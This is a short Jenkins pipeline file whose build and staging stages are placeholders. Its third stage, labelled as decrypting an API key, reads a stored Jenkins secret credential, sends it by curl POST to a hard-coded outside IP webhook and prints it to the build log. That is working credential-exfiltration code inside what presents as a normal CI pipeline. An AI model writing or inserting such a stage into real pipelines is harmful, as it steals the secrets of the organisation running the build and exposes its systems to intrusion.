node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt API KEY') {
      withCredentials([string(credentialsId: 'd75d640a-8338-4580-944f-9c3ab287da49',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.212.177.0:5000/webhook'
        '''
      }
      println apiKey
    }
}
